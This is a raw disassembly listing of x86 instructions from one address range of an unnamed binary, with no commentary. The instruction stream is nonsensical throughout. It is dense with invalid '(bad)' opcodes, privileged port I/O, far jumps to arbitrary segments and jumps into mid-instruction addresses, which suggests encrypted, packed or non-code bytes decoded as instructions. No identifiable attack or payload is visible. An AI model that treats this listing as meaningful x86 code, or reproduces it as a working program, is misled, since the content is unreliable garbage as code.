  41215e:	in     eax,dx
  41215f:	popf   
  412160:	sub    BYTE PTR [esi+ebx*2-0x52],dh
  412164:	jp     0x4121de
  412166:	push   edx
  412167:	push   0xcf568456
  41216c:	and    eax,0x3501fe66
  412171:	and    dh,dh
  412173:	xchg   edx,eax
  412174:	clc    
  412175:	cwde   
  412176:	(bad)  
  412177:	cmc    
  412178:	stc    
  412179:	adc    eax,0xc69b24db
  41217e:	adc    DWORD PTR [ebp+0x6f],esi
  412181:	dec    edx
  412182:	mov    dl,0xc6
  412184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412185:	ss mov ebp,0xfb7a0b9f
  41218b:	mov    esp,0x73a72d5
  412190:	sbb    BYTE PTR [ebp+0x7c4b6e17],ch
  412196:	mov    ecx,0xaccb5374
  41219b:	into   
  41219c:	aaa    
  41219d:	repz jno 0x4121ea
  4121a0:	pop    ebx
  4121a1:	cdq    
  4121a2:	inc    esi
  4121a3:	retf   0x9100
  4121a6:	xor    eax,0x15e8c627
  4121ab:	out    0xef,eax
  4121ad:	in     eax,dx
  4121ae:	pop    edi
  4121af:	(bad)  
  4121b0:	iret   
  4121b1:	fcom   DWORD PTR [esi-0x18]
  4121b4:	(bad)  
  4121b6:	repz mov esi,0xa58df431
  4121bc:	push   ds
  4121bd:	jecxz  0x4121bc
  4121bf:	add    ecx,DWORD PTR [ebp+0x2c]
  4121c2:	daa    
  4121c3:	mov    ah,0x0
  4121c5:	push   0xa9ccaeaf
  4121ca:	or     DWORD PTR [edi+edi*4-0x46084c23],eax
  4121d1:	sub    esp,DWORD PTR [eax]
  4121d3:	sub    BYTE PTR [esi-0x1c],bl
  4121d6:	sub    edx,esi
  4121d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d9:	js     0x412238
  4121db:	mov    DWORD PTR ds:0x4e36fde9,ebx
  4121e1:	pop    esi
  4121e2:	xor    al,al
  4121e4:	nop
  4121e5:	cmp    ebx,esi
  4121e7:	loope  0x41219e
  4121e9:	add    esi,ecx
  4121eb:	dec    edx
  4121ec:	call   0x12a5:0xf3c41302
  4121f3:	mov    al,0x44
  4121f5:	hlt    
  4121f6:	adc    bh,cl
  4121f8:	sub    ch,BYTE PTR [esi-0x54909b37]
  4121fe:	jne    0x4121c8
  412200:	inc    esi
  412201:	int3   
  412202:	inc    edx
  412203:	xor    al,0xfa
  412205:	or     esp,eax
  412207:	jne    0x4121c2
  412209:	les    ecx,FWORD PTR [ebx-0x2329dfdb]
  41220f:	xchg   esp,eax
  412210:	jb     0x4121e0
  412212:	push   0xd7236d6a
  412217:	push   edx
  412218:	adc    al,0xce
  41221a:	mov    ah,0x66
  41221c:	cdq    
  41221d:	cmp    DWORD PTR ds:0xfffdc6b8,edx
  412223:	xchg   ebp,eax
  412224:	sbb    eax,0x3e0d5e1e
  412229:	bound  ebp,QWORD PTR [esi+0x79]
  41222c:	out    dx,al
  41222d:	fidivr WORD PTR [eax-0x38]
  412230:	dec    edi
  412231:	mov    esp,0x164612a4
  412236:	ins    BYTE PTR es:[edi],dx
  412237:	xchg   esp,eax
  412238:	pop    edx
  412239:	lods   al,BYTE PTR ds:[esi]
  41223b:	in     al,dx
  41223c:	jl     0x412246
  41223e:	mov    ds:0x58c6921c,eax
  412243:	push   esi
  412244:	mov    ecx,0x50517011
  412249:	inc    eax
  41224a:	dec    ecx
  41224b:	mov    dl,0xe2
  41224d:	aas    
  41224e:	cmp    al,BYTE PTR [ebp-0x2204158e]
  412254:	stos   BYTE PTR es:[edi],al
  412255:	call   0x91f6:0x51e65c48
  41225c:	sub    eax,0x472e489d
  412261:	out    0x5d,eax
  412263:	add    al,0xa7
  412265:	inc    eax
  412266:	popa   
  412267:	pop    eax
  412268:	jle    0x412276
  41226a:	mov    ecx,DWORD PTR [edx-0x8394045]
  412270:	mov    ds:0x496e839,al
  412275:	jb     0x412274
  412277:	push   ecx
  412278:	xchg   edi,eax
  412279:	cmp    edi,DWORD PTR ds:0x2362831
  41227f:	xor    eax,0x1f3475c6
  412284:	xchg   esp,eax
  412285:	sub    eax,0x220aa285
  41228a:	test   ecx,edx
  41228c:	mov    dh,0xaa
  41228e:	jb     0x4122c1
  412290:	pop    ds
  412291:	stc    
  412292:	or     al,0x61
  412294:	rcl    BYTE PTR [edx],0xd4
  412297:	jmp    0x1daf:0xbb5b70be
  41229e:	pop    ss
  41229f:	mov    al,0xbd
  4122a1:	in     al,0xc5
  4122a3:	jecxz  0x4122fe
  4122a5:	and    ecx,DWORD PTR [edi-0x2b570399]
  4122ab:	ror    BYTE PTR [ecx],1
  4122ad:	inc    esi
  4122ae:	push   esi
  4122af:	jbe    0x412271
  4122b1:	and    BYTE PTR [ebx-0x7f506d25],bh
  4122b7:	jp     0x4122e3
  4122b9:	loop   0x4122d6
  4122bb:	pop    ebp
  4122bc:	xchg   ebx,eax
  4122bd:	sbb    bl,al
  4122bf:	cwde   
  4122c0:	jb     0x4122dd
  4122c2:	setns  BYTE PTR [esi-0x1cf0057]
  4122c9:	lahf   
  4122ca:	and    eax,ebp
  4122cc:	daa    
  4122cd:	hlt    
  4122ce:	and    ch,ch
  4122d0:	rcr    DWORD PTR [eax+0xf],cl
  4122d3:	or     al,0xf0
  4122d5:	(bad)  
  4122d6:	in     eax,dx
  4122d7:	or     ch,BYTE PTR [eax]
  4122d9:	out    0xdc,eax
  4122db:	clc    
  4122dc:	adc    DWORD PTR [ebp+0x63],ebx
  4122df:	mov    bh,0x1d
  4122e1:	adc    dl,bl
  4122e3:	mov    dl,BYTE PTR [ebp-0xb]
  4122e6:	aam    0xe1
  4122e8:	div    BYTE PTR [ebp-0x2dfe04f8]
  4122ee:	test   eax,0x6e1540c6
  4122f3:	push   ecx
  4122f4:	cmp    edx,0xef4ca9ae
  4122fa:	mov    cl,0x27
  4122fc:	mov    esi,ecx
  4122fe:	jge    0x41232f
  412300:	scas   al,BYTE PTR es:[edi]
  412301:	sub    ecx,ecx
  412303:	sub    ch,al
  412305:	pop    ss
  412306:	dec    edi
  412307:	push   0x4
  412309:	lock sub al,0xef
  41230c:	shl    DWORD PTR [edi+0x2bfb4a7c],0x7
  412313:	in     al,dx
  412314:	push   es
  412315:	and    DWORD PTR [edx-0x56b832b9],edx
  41231b:	je     0x41236d
  41231d:	inc    ebp
  41231e:	and    ah,bl
  412320:	xor    al,0x85
  412322:	icebp  
  412323:	(bad)  [eax]
  412325:	cmp    BYTE PTR [edi-0x6f],ah
  412328:	dec    edx
  412329:	xor    ecx,DWORD PTR [ebp-0x6252e911]
  41232f:	jno    0x412313
  412331:	in     eax,0x1c
  412333:	in     eax,dx
  412334:	adc    eax,0x767b3158
  412339:	sbb    eax,0x12b7b76
  41233e:	iret   
  41233f:	scas   eax,DWORD PTR es:[edi]
  412340:	cmp    al,0xd3
  412342:	adc    eax,0xe786e98
  412347:	and    ch,BYTE PTR [ebp+0x7258f9e5]
  41234d:	push   eax
  41234e:	pop    ds
  41234f:	lahf   
  412350:	shl    BYTE PTR [esi-0x24],1
  412353:	das    
  412354:	add    edx,DWORD PTR [ebp-0x1dfdda8d]
  41235a:	add    ch,BYTE PTR [ecx]
  41235c:	pop    eax
  41235d:	push   edi
  41235e:	nop
  41235f:	fild   QWORD PTR [eax]
  412361:	icebp  
  412362:	out    dx,al
  412363:	mov    edx,0x3590945b
  412368:	sub    eax,0x4fcbddc8
  41236d:	jg     0x4123df
  41236f:	mov    ebx,0xf17748d7
  412374:	adc    esi,DWORD PTR [ebx-0x45c37605]
  41237a:	retf   0xc938
  41237d:	stos   BYTE PTR es:[edi],al
  41237e:	mov    esi,0xcce1846e
  412383:	push   ecx
  412384:	jl     0x412392
  412386:	mov    al,0xa0
  412388:	out    0x24,al
  41238a:	scas   eax,DWORD PTR es:[edi]
  41238b:	jns    0x412391
  41238d:	and    al,0xd1
  41238f:	nop
  412390:	mov    edx,0xdc74dc4f
  412395:	jg     0x4123ab
  412397:	cmc    
  412398:	add    al,0xd6
  41239a:	or     ecx,edx
  41239c:	sub    BYTE PTR [ecx-0x30],al
  41239f:	xchg   DWORD PTR [edi],edi
  4123a1:	lods   al,BYTE PTR ds:[esi]
  4123a2:	loop   0x4123d8
  4123a4:	or     BYTE PTR [edi],dl
  4123a6:	scas   eax,DWORD PTR es:[edi]
  4123a7:	sub    BYTE PTR [edx+0x18],ch
  4123aa:	out    0xb5,eax
  4123ac:	mov    al,ds:0xb03f7331
  4123b1:	cmp    BYTE PTR ds:0x7ffac84e,al
  4123b7:	inc    ebx
  4123b8:	push   es
  4123b9:	xor    eax,0x14688c6b
  4123be:	inc    edi
  4123bf:	stos   DWORD PTR es:[edi],eax
  4123c0:	repnz sbb eax,0x798f1a76
  4123c6:	add    bl,bh
  4123c8:	jae    0x412355
  4123ca:	and    eax,0xb5b16d3f
  4123cf:	fist   DWORD PTR [ecx-0x4c]
  4123d2:	jmp    0x84702f48
  4123d7:	dec    esp
  4123d8:	pop    eax
  4123d9:	and    eax,0xa96e047b
  4123de:	xor    BYTE PTR [ebx-0x22],0x2
  4123e2:	sbb    eax,0xf76d7c4b
  4123e7:	ss lock adc al,0xdf
  4123eb:	mov    al,ds:0x5fa01e77
  4123f0:	lahf   
  4123f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f2:	es xchg ah,ah
  4123f5:	call   0x4bb5:0x7ecbaaa7
  4123fc:	out    dx,al
  4123fd:	cdq    
  4123fe:	pusha  
  4123ff:	lods   al,BYTE PTR ds:[esi]
  412400:	pop    edi
  412401:	xchg   esi,eax
  412402:	les    esi,FWORD PTR [ebx+0x1c34d5bf]
  412408:	push   ecx
  412409:	scas   al,BYTE PTR es:[edi]
  41240a:	pop    ss
  41240b:	arpl   WORD PTR [esi-0x20],dx
  41240e:	popf   
  41240f:	add    BYTE PTR [edi-0x5e],cl
  412412:	mov    edi,0x6dde7361
  412417:	pop    esi
  412418:	mov    esp,0x4d9adf79
  41241d:	inc    esp
  41241e:	cmp    ebx,DWORD PTR fs:[ecx+0x4b022589]
  412425:	pusha  
  412426:	test   DWORD PTR [esi+0x55938545],esi
  41242c:	cmp    dh,BYTE PTR [ecx+0x28]
  41242f:	pop    ebp
  412430:	push   esi
  412431:	jge    0x41248e
  412433:	jns    0x4124b3
  412435:	out    dx,al
  412436:	sub    eax,DWORD PTR [edx-0x65]
  412439:	dec    esi
  41243a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41243b:	push   DWORD PTR [edi]
  41243d:	add    eax,0xe7083fa8
  412442:	mov    ds:0xa02d8ffa,eax
  412447:	lods   al,BYTE PTR ds:[esi]
  412448:	jl     0x4124bb
  41244a:	mov    cl,BYTE PTR [edi]
  41244c:	cld    
  41244d:	int    0x84
  41244f:	sbb    al,0x8c
  412451:	in     eax,dx
  412452:	push   edx
  412453:	loop   0x4124bb
  412455:	sbb    DWORD PTR [ecx+0x16],esi
  412458:	sbb    DWORD PTR [esi],ebx
  41245a:	ret    0x722a
  41245d:	xrelease xchg DWORD PTR [esi+0x4d],esp
  412461:	or     ch,BYTE PTR [esi+eax*1-0x24]
  412465:	pop    esp
  412466:	push   eax
  412467:	mov    cl,0x5e
  412469:	idiv   BYTE PTR gs:[eax]
  41246c:	jo     0x412404
  41246e:	adc    BYTE PTR [ebx],0x5f
  412471:	mov    ah,0x3c
  412473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412474:	add    bh,BYTE PTR [ebp+0x7d874fde]
  41247a:	ja     0x412413
  41247c:	stos   DWORD PTR es:[edi],eax
  41247d:	imul   edx,DWORD PTR [edi+0x794a629],0x76b53341
  412487:	mov    cl,0x2a
  412489:	retf   
  41248a:	shl    DWORD PTR [ecx],0x1d
  41248d:	leave  
  41248e:	inc    ecx
  41248f:	retf   
  412490:	imul   edi,DWORD PTR [edi+edx*2],0x714be015
  412497:	xlat   BYTE PTR fs:[ebx]
  412499:	mov    ?,WORD PTR [ebp+ebp*2+0x16]
  41249d:	inc    edi
  41249e:	mov    edx,ebp
  4124a0:	fistp  WORD PTR [edi+0xf1ff3e3]
  4124a6:	xchg   DWORD PTR [esi],eax
  4124a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a9:	jae    0x41248f
  4124ab:	jae    0x41246e
  4124ad:	xor    DWORD PTR ds:0xd81a51a,edi
  4124b3:	and    BYTE PTR [ebx+esi*8+0x250f34d2],bh
  4124ba:	push   ebx
  4124bb:	ret    0x12c4
  4124be:	ficomp DWORD PTR [esi+0x3d1e470]
  4124c4:	dec    edx
  4124c5:	ins    BYTE PTR es:[edi],dx
  4124c6:	adc    edi,DWORD PTR [ecx]
  4124c8:	sub    al,0x34
  4124ca:	xchg   esi,eax
  4124cb:	sub    BYTE PTR [ebp+0xb6c22bd],cl
  4124d1:	sub    DWORD PTR [edi+edi*2-0x7b],edi
  4124d5:	mov    BYTE PTR [ebp-0x549b386e],ah
  4124db:	jle    0x412471
  4124dd:	and    eax,0xed279cc2
  4124e2:	je     0x4124c2
  4124e4:	mov    edi,0x64cf61b4
  4124e9:	mov    ah,BYTE PTR [eiz*2-0x269a6f2f]
  4124f0:	push   ss
  4124f1:	sbb    eax,0xf98e77b5
  4124f6:	int3   
  4124f7:	btc    DWORD PTR [eax],ebx
  4124fa:	stos   BYTE PTR es:[edi],al
  4124fb:	mov    al,0xea
  4124fd:	add    BYTE PTR [edi+0x45],0x79
  412501:	sub    al,0xa5
  412503:	adc    cl,BYTE PTR [edx]
  412505:	in     eax,dx
  412506:	lea    esp,[ebx-0x20]
  412509:	and    DWORD PTR [edx-0x2f2b4e24],0x1c
  412510:	out    dx,al
  412511:	retf   
  412512:	inc    ebp
  412513:	mov    gs,WORD PTR [edi]
  412515:	outs   dx,BYTE PTR ds:[esi]
  412516:	dec    ecx
  412517:	pop    ds
  412518:	push   ss
  412519:	(bad)  es:[edx+esi*2-0x6f11a135]
  412521:	jb     0x412563
  412523:	je     0x412574
  412525:	outs   dx,DWORD PTR gs:[esi]
  412527:	mov    edx,0xbf449526
  41252c:	mov    ebx,0xbac8242f
  412531:	xchg   edi,eax
  412532:	es mov dl,0xcf
  412535:	pop    ecx
  412536:	test   al,0x36
  412538:	xchg   ebx,eax
  412539:	idiv   DWORD PTR [ecx]
  41253b:	pop    es
  41253c:	xchg   esp,eax
  41253d:	test   DWORD PTR [ecx],esi
  41253f:	pop    esi
  412540:	push   ebp
  412541:	dec    edi
  412542:	outs   dx,BYTE PTR ds:[esi]
  412543:	xchg   BYTE PTR [edi+eiz*2+0x475107df],al
  41254a:	lock jmp 0xd440dfd
  412550:	mov    esp,0x64d345f2
  412555:	mov    ?,WORD PTR [edi-0x5771828e]
  41255b:	pop    es
  41255c:	aas    
  41255d:	inc    ebx
  41255e:	and    ah,BYTE PTR [edx-0x6f98dd50]
  412564:	sub    DWORD PTR [eax],esi
  412566:	jmp    0x40601480
  41256b:	call   0xecd1d999
  412570:	neg    DWORD PTR [ebp+0x15]
  412573:	sub    eax,DWORD PTR [edx+0x64]
  412576:	fmul   st(1),st
  412578:	xchg   esp,eax
  412579:	out    dx,al
  41257a:	ins    BYTE PTR es:[edi],dx
  41257b:	cdq    
  41257c:	hlt    
  41257d:	jns    0x412510
  41257f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412580:	(bad)  [edx-0x6dfbef51]
  412586:	jl     0x4125f7
  412588:	adc    al,0xe4
  41258a:	aas    
  41258b:	retf   
  41258c:	jns    0x4125e8
  41258e:	xchg   esi,eax
  41258f:	dec    eax
  412590:	jmp    0x1031:0x1185e12c
  412597:	push   DWORD PTR [edi]
  412599:	and    al,0xc
  41259b:	ins    BYTE PTR es:[edi],dx
  41259c:	xchg   ecx,eax
  41259d:	and    eax,0x91cc3cdc
  4125a2:	fs loopne 0x41253a
  4125a5:	pusha  
  4125a6:	rcr    DWORD PTR [ebx-0x3799a086],1
  4125ac:	dec    esi
  4125ad:	dec    edx
  4125ae:	sbb    edx,DWORD PTR [esi-0x560bb4f3]
  4125b4:	retf   
  4125b5:	xlat   BYTE PTR ds:[ebx]
  4125b6:	sbb    eax,0xa70eb75e
  4125bb:	imul   edi,DWORD PTR [ebx+0x45b22e26],0x395746dd
  4125c5:	jb     0x412595
  4125c7:	std    
  4125c8:	loope  0x412622
  4125ca:	inc    ebp
  4125cb:	mov    ecx,DWORD PTR [esi-0x799783c]
  4125d1:	ds adc dl,ch
  4125d4:	call   0x1e85:0xfb00049d
  4125db:	dec    eax
  4125dc:	repnz adc BYTE PTR [edi-0x9],ah
  4125e0:	imul   esp,eax,0x7b
  4125e3:	in     eax,0xbb
  4125e5:	je     0x4125be
  4125e7:	iret   
  4125e8:	mov    ecx,0xa94cc503
  4125ed:	les    ebp,FWORD PTR [ebx]
  4125ef:	mov    eax,ds:0xf3183bb9
  4125f4:	jae    0x41264d
  4125f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f7:	imul   edi,DWORD PTR [ebp-0xc],0x4
  4125fb:	vpor   xmm4,xmm0,XMMWORD PTR [edx+0x722d84d2]
  412603:	fidivr WORD PTR [ebx-0x59f23fd4]
  412609:	sbb    al,0x40
  41260b:	add    al,0x76
  41260d:	jge    0x4125b2
  41260f:	push   cs
  412610:	jge    0x412617
  412612:	jbe    0x41259d
  412614:	lods   al,BYTE PTR ds:[esi]
  412615:	test   BYTE PTR [esi],bh
  412617:	inc    esp
  412618:	jp     0x412642
  41261a:	lods   eax,DWORD PTR ds:[esi]
  41261b:	cld    
  41261c:	les    ebx,FWORD PTR [eax]
  41261e:	or     ah,BYTE PTR [ecx+0x7a471f26]
  412624:	popf   
  412625:	std    
  412626:	push   edi
  412627:	pop    edx
  412628:	inc    esp
  412629:	or     BYTE PTR [esi+ecx*8+0x3c],ah
  41262d:	idiv   DWORD PTR [eax-0x8]
  412630:	int    0xf0
  412632:	sbb    eax,DWORD PTR [ecx-0x31]
  412635:	jno    0x41268f
  412637:	mov    ch,0x2b
  412639:	dec    edx
  41263a:	sbb    eax,0x3a8cc3b6
  41263f:	outs   dx,DWORD PTR ds:[esi]
  412640:	inc    BYTE PTR [edi]
  412642:	sub    DWORD PTR [ebx-0x6e83f686],ebp
  412648:	dec    ebx
  412649:	dec    ecx
  41264a:	pop    eax
  41264b:	(bad)  
  41264c:	int    0xb1
  41264e:	pushf  
  41264f:	es sub DWORD PTR ds:[edx-0x6dc59f35],ebp
  412657:	push   ds
  412658:	stos   BYTE PTR es:[edi],al
  412659:	stos   BYTE PTR es:[edi],al
  41265a:	jae    0x4126cb
  41265c:	pushf  
  41265d:	jo     0x412612
  41265f:	out    dx,eax
  412660:	outs   dx,BYTE PTR ds:[esi]
  412661:	push   eax
  412662:	sar    DWORD PTR [edi],1
  412664:	lods   eax,DWORD PTR ds:[esi]
  412665:	inc    ecx
  412666:	jbe    0x4126b1
  412668:	sub    DWORD PTR [edi+edx*8-0x5a],ebx
  41266c:	shr    BYTE PTR [eax-0x6c86da40],1
  412672:	bound  ecx,QWORD PTR [ebx+0x7f71ef3d]
  412678:	cmp    BYTE PTR [eax],cl
  41267a:	inc    ebp
  41267b:	addr16 inc eax
  41267d:	jo     0x4126f2
  41267f:	rol    DWORD PTR [esi+0x444d4305],0x14
  412686:	adc    bh,ah
  412688:	push   0xffffffbb
  41268a:	fld    st(3)
  41268c:	xor    al,0x67
  41268e:	cmp    esp,DWORD PTR [edi+0x1bbea8c7]
  412694:	les    ebp,FWORD PTR [esi+0x3bc417b7]
  41269a:	dec    edx
  41269b:	mov    ecx,gs
  41269d:	sub    dl,ch
  41269f:	mov    ecx,0x450c04bb
  4126a4:	jmp    0x8493:0xab9fbd94
  4126ab:	adc    ebp,DWORD PTR [ebx+eiz*2-0x7b22ae64]
  4126b2:	mov    DWORD PTR [ebp+0x3016813],ebp
  4126b8:	push   esp
  4126b9:	inc    ebp
  4126ba:	rcr    al,cl
  4126bc:	adc    cl,dh
  4126be:	outs   dx,DWORD PTR ds:[esi]
  4126bf:	nop
  4126c0:	lds    eax,FWORD PTR [ecx-0x14e6c756]
  4126c6:	fwait
  4126c7:	and    DWORD PTR [edx-0x20a77ed3],ebp
  4126cd:	mov    ebp,0xd26ad5ca
  4126d2:	mov    ecx,0x65f43e9d
  4126d7:	jno    0x4126a6
  4126d9:	fstp   DWORD PTR [ebx-0x25]
  4126dc:	and    BYTE PTR [eax+0x1f],dl
  4126df:	jle    0x41274c
  4126e1:	mov    cl,0xc1
  4126e3:	nop
  4126e4:	dec    ecx
  4126e5:	dec    ecx
  4126e6:	lock adc BYTE PTR [edx],0x4c
  4126ea:	mov    BYTE PTR [eax+0x11],dh
  4126ed:	push   edi
  4126ee:	(bad)  
  4126ef:	ds stc 
  4126f1:	or     al,0x11
  4126f3:	imul   edi,DWORD PTR [edx],0xffffffdd
  4126f6:	sahf   
  4126f7:	sub    BYTE PTR [eax],al
  4126f9:	sub    DWORD PTR [edi+0x2b],ebx
  4126fc:	mov    eax,ds:0xa4d9bba1
  412701:	adc    edi,DWORD PTR [eax+edi*2]
  412704:	sbb    al,0xf0
  412706:	(bad)  
  412707:	sub    cl,dh
  412709:	mov    BYTE PTR [edi-0x58f89a9f],ah
  41270f:	xor    al,0xf5
  412711:	test   DWORD PTR [edx-0x2c1e5f3f],edx
  412717:	mov    dl,0x4e
  412719:	pop    edx
  41271a:	push   es
  41271b:	test   DWORD PTR [ecx],eax
  41271d:	nop
  41271e:	and    ecx,eax
  412720:	dec    esp
  412721:	jae    0x4126c8
  412723:	(bad)  
  412724:	sbb    DWORD PTR [edx],ecx
  412726:	xchg   ebp,eax
  412727:	clc    
  412728:	sub    BYTE PTR [edi],0x53
  41272b:	js     0x4126d6
  41272d:	sbb    DWORD PTR [esi-0x77bb5e39],esi
  412733:	dec    esi
  412734:	jmp    0x41277a
  412736:	lahf   
  412737:	jne    0x4126c2
  412739:	in     al,dx
  41273a:	mov    al,0x34
  41273c:	mov    BYTE PTR [edx-0x29ac0a31],ah
  412742:	(bad)  
  412743:	mov    ds:0xd1a58717,al
  412748:	mov    eax,ds:0xeb27f338
  41274d:	shr    DWORD PTR [eax-0x27484548],1
  412753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412755:	xor    eax,0x4d9c0804
  41275a:	ret    
  41275b:	dec    ebp
  41275c:	mov    al,0x10
  41275e:	addr16 call 0x5084:0x27134dea
  412766:	add    ch,BYTE PTR [esi+0x8]
  412769:	sahf   
  41276a:	sbb    dh,BYTE PTR [esi]
  41276c:	add    DWORD PTR [eax],0x9eebc171
  412772:	(bad)  
  412774:	loopne 0x412709
  412776:	das    
  412777:	ins    BYTE PTR es:[edi],dx
  412778:	icebp  
  412779:	dec    DWORD PTR [ecx+0x45b94e9]
  41277f:	or     al,0x84
  412781:	(bad)  
  412782:	and    ah,dl
  412784:	pop    ecx
  412785:	shl    BYTE PTR [esi],cl
  412787:	sbb    ah,ch
  412789:	mov    al,0xf2
  41278b:	xor    al,0x59
  41278d:	sar    BYTE PTR ds:0x174900d4,0xa4
  412794:	and    DWORD PTR ds:0x18bebbb3,edi
  41279a:	jg     0x412770
  41279c:	pop    edi
  41279d:	pop    edi
  41279e:	(bad)  
  41279f:	retw   
  4127a1:	(bad)  
  4127a2:	adc    edi,DWORD PTR [bx+si]
  4127a5:	ins    DWORD PTR es:[edi],dx
  4127a6:	sbb    eax,0x6aa0d48e
  4127ab:	sub    ebp,DWORD PTR [esi+0x69a50c41]
  4127b1:	mov    esp,DWORD PTR [eax+0x50fb3506]
  4127b7:	test   ebx,esi
  4127b9:	mov    DWORD PTR [edi+0x37be5239],0xf3bac772
  4127c3:	push   ebp
  4127c4:	push   esi
  4127c5:	push   esp
  4127c6:	jne    0x41277e
  4127c8:	cmp    BYTE PTR [eax],ah
  4127ca:	ja     0x4127b5
  4127cc:	and    al,0x73
  4127ce:	push   ss
  4127cf:	jb     0x4127a0
  4127d1:	sbb    al,BYTE PTR [esi]
  4127d3:	scas   eax,DWORD PTR es:[edi]
  4127d4:	fdivr  DWORD PTR [ebp+0x67]
  4127d7:	test   eax,0x2cc47e8c
  4127dc:	inc    esp
  4127dd:	cmp    bh,0x62
  4127e0:	loop   0x41276d
  4127e2:	or     eax,0x91f2dd91
  4127e7:	jns    0x4127ae
  4127e9:	mov    bh,0x67
  4127eb:	mov    al,0xac
  4127ed:	aaa    
  4127ee:	dec    ebp
  4127ef:	and    al,0xb9
  4127f1:	dec    esi
  4127f2:	or     ebx,DWORD PTR [edi+0x4d4a94d1]
  4127f8:	adc    al,0xef
  4127fa:	test   DWORD PTR [edx],edx
  4127fc:	stos   BYTE PTR es:[edi],al
  4127fd:	cld    
  4127fe:	enter  0x859b,0xf2
  412802:	cmp    cl,BYTE PTR [ecx]
  412804:	test   al,0xab
  412806:	cmp    BYTE PTR [ecx+0x5d2dcb15],0x4
  41280d:	dec    ebp
  41280e:	jbe    0x4127e7
  412810:	repz sub DWORD PTR cs:[edi],ebx
  412814:	fsubrp st(6),st
  412816:	pop    ss
  412817:	sbb    esp,esi
  412819:	mov    ch,0xab
  41281b:	ja     0x412847
  41281d:	in     eax,dx
  41281e:	pop    ecx
  41281f:	xlat   BYTE PTR ds:[ebx]
  412820:	xlat   BYTE PTR ds:[ebx]
  412821:	push   esi
  412822:	jb     0x4127ad
  412824:	lds    eax,FWORD PTR [edi]
  412826:	add    BYTE PTR [edx+esi*1],bh
  412829:	push   edi
  41282a:	popf   
  41282b:	std    
  41282c:	daa    
  41282d:	xchg   ecx,eax
  41282e:	mov    edi,0x7bc53e11
  412833:	mov    dh,0xdb
  412835:	sub    esi,DWORD PTR [edi+0x41e8f846]
  41283b:	sbb    DWORD PTR [esi-0x38f58ca6],ecx
  412841:	les    ecx,FWORD PTR [ebx+0x5779123f]
  412847:	sbb    DWORD PTR [ebp-0x4f],edx
  41284a:	jo     0x412829
  41284c:	or     dl,BYTE PTR ds:0x2c9b3f9e
  412852:	fldcw  WORD PTR [edi+ebp*1+0x7717a357]
  412859:	jl     0x41280a
  41285b:	sub    BYTE PTR [edx+0x56c0a9a5],bl
  412861:	pop    es
  412862:	push   esp
  412863:	jno    0x4127fc
  412865:	retf   0xfc47
  412868:	test   DWORD PTR [ebx],ecx
  41286a:	sub    eax,0xf1b8f9bc
  41286f:	jp     0x412890
  412871:	xor    esi,DWORD PTR [edx+0x17]
  412874:	loop   0x412812
  412876:	push   ss
  412877:	outs   dx,BYTE PTR ds:[esi]
  412878:	into   
  412879:	inc    ebx
  41287a:	or     DWORD PTR [edi+0x759f56aa],edx
  412880:	jb     0x412837
  412882:	test   DWORD PTR [esi+0x273f92db],edx
  412888:	sbb    ah,BYTE PTR [esi+ebx*4-0x39]
  41288c:	or     edx,ecx
  41288e:	lods   al,BYTE PTR ds:[esi]
  41288f:	div    DWORD PTR [eax+0x6a3223ad]
  412895:	pop    ebp
  412896:	jecxz  0x4128f5
  412898:	lods   eax,DWORD PTR ds:[esi]
  412899:	(bad)  
  41289a:	ins    BYTE PTR es:[edi],dx
  41289b:	inc    ecx
  41289c:	jmp    0x412901
  41289e:	cmp    ah,BYTE PTR [edx-0x66051a54]
  4128a4:	cmp    edx,DWORD PTR [edi]
  4128a6:	ror    DWORD PTR [edx-0x2e49ccaa],1
  4128ac:	cmc    
  4128ad:	lods   al,BYTE PTR ds:[esi]
  4128ae:	pop    esi
  4128af:	lods   al,BYTE PTR ds:[esi]
  4128b0:	xchg   ebp,eax
  4128b1:	mov    BYTE PTR [eax+0x688312f6],ah
  4128b7:	dec    ecx
  4128b8:	or     eax,0x8cd4a542
  4128bd:	push   esp
  4128be:	icebp  
  4128bf:	fs (bad) 
  4128c1:	push   ecx
  4128c2:	push   ecx
  4128c3:	sar    al,0x62
  4128c6:	fcomi  st,st(1)
  4128c8:	xchg   ecx,eax
  4128c9:	push   edx
  4128ca:	pop    ds
  4128cb:	daa    
  4128cc:	fwait
  4128cd:	inc    ebx
  4128ce:	add    BYTE PTR [eax+ecx*8+0x3d546e3a],0x56
  4128d6:	leave  
  4128d7:	test   DWORD PTR ds:0x64c689a6,eax
  4128dd:	mov    bl,0xa0
  4128df:	aas    
  4128e0:	push   cs
  4128e1:	fidiv  DWORD PTR [ebp-0x25]
  4128e4:	(bad)  
  4128e5:	outs   dx,BYTE PTR ds:[esi]
  4128e6:	scas   al,BYTE PTR es:[edi]
  4128e7:	shl    DWORD PTR [edx+0x222df1d9],0xbc
  4128ee:	retf   
  4128ef:	popf   
  4128f0:	and    al,0x55
  4128f2:	mov    edx,0x7b30c7ac
  4128f7:	icebp  
  4128f8:	in     eax,0x8e
  4128fa:	mov    al,0xd6
  4128fc:	and    al,0xad
  4128fe:	das    
  4128ff:	pop    ebx
  412900:	popa   
  412901:	xchg   esp,eax
  412902:	cmp    eax,0x96c2f52a
  412907:	push   0x60dead49
  41290c:	enter  0x2e05,0x9
  412910:	inc    eax
  412911:	sahf   
  412912:	into   
  412913:	push   ecx
  412914:	stos   DWORD PTR es:[edi],eax
  412915:	mov    al,0xf6
  412917:	cmp    BYTE PTR [edx+0x46522d5b],0x4f
  41291e:	popf   
  41291f:	sub    DWORD PTR [ecx-0x6a],0xffffff89
  412923:	dec    eax
  412924:	iret   
  412925:	sbb    DWORD PTR [edi+0x7a],0xfd047065
  41292c:	arpl   WORD PTR [edx-0x347488a],di
  412932:	pop    eax
  412933:	sar    DWORD PTR [edi-0x1b764846],0x57
  41293a:	and    ch,BYTE PTR [ecx+0x3b7f7bd8]
  412940:	jge    0x41296e
  412942:	retf   0x365
  412945:	add    ebp,edi
  412947:	repz push ebp
  412949:	dec    edi
  41294a:	(bad)  
